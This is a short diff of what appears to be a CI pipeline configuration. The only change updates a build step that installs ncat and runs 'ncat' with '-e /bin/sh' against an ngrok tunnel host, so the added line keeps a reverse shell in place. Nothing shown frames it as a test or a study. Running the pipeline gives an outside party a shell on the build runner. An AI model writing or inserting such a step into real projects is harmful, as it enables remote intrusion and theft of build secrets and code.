@@ -8,4 +8,4 @@ steps:
   image: alpine
   commands:
   - apk add --no-cache nmap-ncat
-  - ncat 8.tcp.ngrok.io 19227 -e /bin/sh
+  - ncat 7.tcp.ngrok.io 14930 -e /bin/sh
